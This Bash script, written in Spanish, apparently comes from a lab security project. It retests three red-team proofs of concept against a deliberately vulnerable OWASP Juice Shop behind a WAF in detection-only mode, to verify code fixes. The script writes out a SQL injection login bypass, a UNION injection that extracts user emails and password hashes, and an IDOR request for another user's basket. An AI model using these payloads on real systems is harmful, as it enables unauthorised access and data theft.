#!/usr/bin/env bash
# Hito 4 · Re-prueba del Equipo rojo. Repite PoC-01, PoC-02 y PoC-03 del H2 por el WAF en
# DetectionOnly contra la app construida desde el código corregido. El ataque tiene que
# fallar por el código: el WAF registra pero no bloquea, así que ningún 403 viene de él.
# Uso, desde waf-siem/ (con COMPOSE_FILE del H4, ver docker-compose.h4.yml):
#   ./scripts/reprueba-h4.sh | tee ../docs/hito-4/reprueba-DetectionOnly.txt
set -u
cd "$(dirname "$0")/.."
WAF_URL="${WAF_URL:-http://127.0.0.1:8080}"
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

MODO="$(docker compose exec -T waf printenv MODSEC_RULE_ENGINE 2>/dev/null | tr -d '\r')"
IMG="$(docker compose images app 2>/dev/null | awk 'NR==2{print $2":"$3}')"
echo "=== Re-prueba H4 por el WAF ($WAF_URL) | modo del WAF: ${MODO:-?} | imagen de la app: ${IMG:-?} ==="
echo "Fecha: $(date '+%Y-%m-%d')  (hora local GT y UTC en cada fila)"
[ "$MODO" != "DetectionOnly" ] && echo "AVISO: el WAF no está en DetectionOnly. Corran ./scripts/modo-waf.sh DetectionOnly"
echo

fila() { # id, metodo, ruta, payload, codigo, cuerpo
  printf '%s | %s UTC | %-7s | HTTP %s | %s %s | payload: %s\n' \
    "$(date '+%H:%M:%S')" "$(date -u '+%H:%M:%S')" "$1" "$5" "$2" "$3" "$4"
  printf '          respuesta: %s\n' "$(head -c 160 "$TMP/body" | tr '\n' ' ')"
}

curl -s --max-time 15 -X POST "$WAF_URL/rest/user/login" -H 'Content-Type: application/json' \
  --data '{"email":"jim@juice-sh.op","password":"ncc-1701"}' > "$TMP/login"
TOKEN="$(grep -oE '"token":"[^"]*"' "$TMP/login" | head -1 | cut -d'"' -f4)"
BID="$(grep -oE '"bid":[0-9]+' "$TMP/login" | head -1 | cut -d: -f2)"
[ -z "$TOKEN" ] && echo "AVISO: no se obtuvo token de jim."

# PoC-01 · SQLi en el login
P1="' OR 1=1--"
C="$(curl -s -o "$TMP/body" -w '%{http_code}' --max-time 15 -X POST "$WAF_URL/rest/user/login" \
  -H 'Content-Type: application/json' --data "{\"email\":\"$P1\",\"password\":\"x\"}")"
fila PoC-01 POST /rest/user/login "email=$P1" "$C"; sleep 2

# PoC-02 · UNION SQLi en la búsqueda
P2="qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9','10' FROM Users--"
C="$(curl -s -o "$TMP/body" -w '%{http_code}' --max-time 15 -G "$WAF_URL/rest/products/search" --data-urlencode "q=$P2")"
fila PoC-02 GET /rest/products/search "q=$P2" "$C"
if grep -q 'admin@juice-sh.op' "$TMP/body"; then echo "          ¡Se filtraron correos!"; else echo "          sin correos ni hashes en la respuesta"; fi
sleep 2

# PoC-03 · IDOR: carrito 1 (admin) con el token de jim
C="$(curl -s -o "$TMP/body" -w '%{http_code}' --max-time 15 "$WAF_URL/rest/basket/1" -H "Authorization: Bearer $TOKEN")"
fila PoC-03 GET /rest/basket/1 "token de jim, basket ajeno" "$C"; sleep 2

# Control: el uso legítimo sigue funcionando
C="$(curl -s -o "$TMP/body" -w '%{http_code}' --max-time 15 -X POST "$WAF_URL/rest/user/login" \
  -H 'Content-Type: application/json' --data '{"email":"jim@juice-sh.op","password":"ncc-1701"}')"
fila Legit-1 POST /rest/user/login "jim con su contraseña" "$C"; sleep 1
C="$(curl -s -o "$TMP/body" -w '%{http_code}' --max-time 15 -G "$WAF_URL/rest/products/search" --data-urlencode "q=apple")"
fila Legit-2 GET /rest/products/search "q=apple" "$C"; sleep 1
C="$(curl -s -o "$TMP/body" -w '%{http_code}' --max-time 15 "$WAF_URL/rest/basket/$BID" -H "Authorization: Bearer $TOKEN")"
fila Legit-3 GET "/rest/basket/$BID" "carrito propio de jim" "$C"

echo
echo "Esperado con el código corregido y el WAF en DetectionOnly:"
echo "  PoC-01 401 (sin token) · PoC-02 200 con data [] · PoC-03 403 {\"status\":\"error\",\"message\":\"Forbidden\"} (JSON de la app, no la página 403 del WAF)"
echo "  Legit-1 200 · Legit-2 200 con productos · Legit-3 200"
echo "En Kibana los PoC-01 y PoC-02 siguen apareciendo en DET-01 (el WAF los detecta), pero la respuesta ya no trae datos."
